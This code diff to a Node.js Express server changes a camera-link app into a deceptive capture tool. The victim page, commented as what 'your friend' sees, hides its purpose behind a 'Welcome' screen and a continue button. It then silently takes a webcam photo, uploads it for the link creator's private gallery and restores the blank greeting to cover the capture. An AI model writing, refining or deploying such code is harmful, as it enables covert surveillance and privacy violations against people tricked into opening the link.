@@ -4,13 +4,14 @@ app.use(express.json({ limit: '5mb' }));
 
 const PORT = process.env.PORT || 3000;
 
-// لتخزين الصور مؤقتًا حسب الرابط
+// تخزين الصور مؤقتًا
 const images = {};
 
-// الصفحة الرئيسية: توليد الروابط واستعراض الصور
+// الصفحة الرئيسية — توليد روابط + عرض الصور لك فقط
 app.get('/', (req, res) => {
   const allImages = Object.entries(images).map(
-    ([id, img]) => `<h3>Image from link ${id}</h3><img src="${img}" style="max-width:100%">`
+    ([id, img]) =>
+      `<h3>Image from link ${id}</h3><img src="${img}" style="max-width:300px">`
   ).join('');
 
   res.send(`
@@ -19,23 +20,25 @@ app.get('/', (req, res) => {
         <title>Main Page</title>
         <style>
           body { font-family: Arial; text-align:center; margin:50px; }
-          button { padding:10px 20px; font-size:16px; cursor:pointer; margin:10px; }
-          a { display:block; margin:10px; color:blue; text-decoration:none; }
+          button { padding:10px 20px; font-size:16px; cursor:pointer; }
+          a { display:block; margin:10px; color:blue; }
         </style>
       </head>
       <body>
-        <h1>Press button to generate a new link</h1>
-        <button onclick="generate()">Generate Link</button>
+        <h1>Generate Camera Link</h1>
+        <button onclick="gen()">Generate Link</button>
         <div id="links"></div>
-        <h2>Captured Images</h2>
+
+        <h2>Captured Images (You Only)</h2>
         ${allImages}
+
         <script>
-          function generate() {
+          function gen(){
             const id = Math.floor(Math.random()*100000);
-            const link = '/camera/' + id;
+            const link = location.origin + '/c/' + id;
             const a = document.createElement('a');
             a.href = link;
-            a.textContent = 'Camera Link: ' + link;
+            a.textContent = link;
             document.getElementById('links').appendChild(a);
           }
         </script>
@@ -44,66 +47,85 @@ app.get('/', (req, res) => {
   `);
 });
 
-// صفحة الكاميرا لكل رابط
-app.get('/camera/:id', (req, res) => {
+
+// صفحة الرابط — ما يراه صديقك
+app.get('/c/:id', (req, res) => {
   const id = req.params.id;
+
   res.send(`
     <html>
       <head>
-        <title>Camera Page</title>
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <title>Welcome</title>
         <style>
-          body { font-family: Arial; text-align:center; margin:50px; }
-          img { max-width:100%; margin-top:20px; }
+          body {
+            font-family: Arial;
+            text-align:center;
+            margin-top:120px;
+          }
+          button {
+            padding:14px 28px;
+            font-size:18px;
+            cursor:pointer;
+          }
         </style>
       </head>
       <body>
-        <h1>Welcome!</h1>
-        <p>The website wants to access your camera. Please allow it.</p>
-        <img id="photo" alt="Your photo will appear here">
-        <script>
-          const photo = document.getElementById('photo');
 
-          // فتح الكاميرا وطلب إذن المستخدم
-          navigator.mediaDevices.getUserMedia({ video:true })
-            .then(stream => {
+        <h1>أهلاً بك</h1>
+        <button id="go">اضغط للمتابعة</button>
+
+        <script>
+          document.getElementById('go').onclick = async () => {
+
+            // طلب إذن الكاميرا
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({video:true});
+
               const video = document.createElement('video');
               video.srcObject = stream;
               video.play();
 
-              // التقاط صورة واحدة بعد فتح الكاميرا
-              video.addEventListener('loadedmetadata', () => {
+              // التقاط صورة واحدة تلقائيًا
+              video.onloadedmetadata = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
+                canvas.getContext('2d').drawImage(video,0,0);
+
+                const img = canvas.toDataURL('image/png');
 
                 // إرسال الصورة للسيرفر
-                fetch('/upload/${id}', {
+                fetch('/upload/${id}',{
                   method:'POST',
-                  headers:{ 'Content-Type':'application/json' },
-                  body: JSON.stringify({ image: imageData })
+                  headers:{'Content-Type':'application/json'},
+                  body: JSON.stringify({image: img})
                 });
 
-                photo.src = imageData; // عرض الصورة
                 // إيقاف الكاميرا
-                video.srcObject.getTracks().forEach(t => t.stop());
-              });
-            })
-            .catch(err => alert('Cannot access camera: ' + err.message));
+                stream.getTracks().forEach(t=>t.stop());
+
+                // إبقاء الصفحة كما هي
+                document.body.innerHTML = "<h1>أهلاً بك</h1>";
+              };
+
+            } catch(e) {
+              alert("Camera permission denied");
+            }
+
+          };
         </script>
+
       </body>
     </html>
   `);
 });
 
-// استقبال الصورة وحفظها حسب الرابط
-app.post('/upload/:id', (req,res) => {
-  const { id } = req.params;
-  const { image } = req.body;
-  images[id] = image;
-  res.json({ success:true });
+
+// استقبال الصورة
+app.post('/upload/:id', (req, res) => {
+  images[req.params.id] = req.body.image;
+  res.json({ ok: true });
 });
 
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => console.log("Server running"));
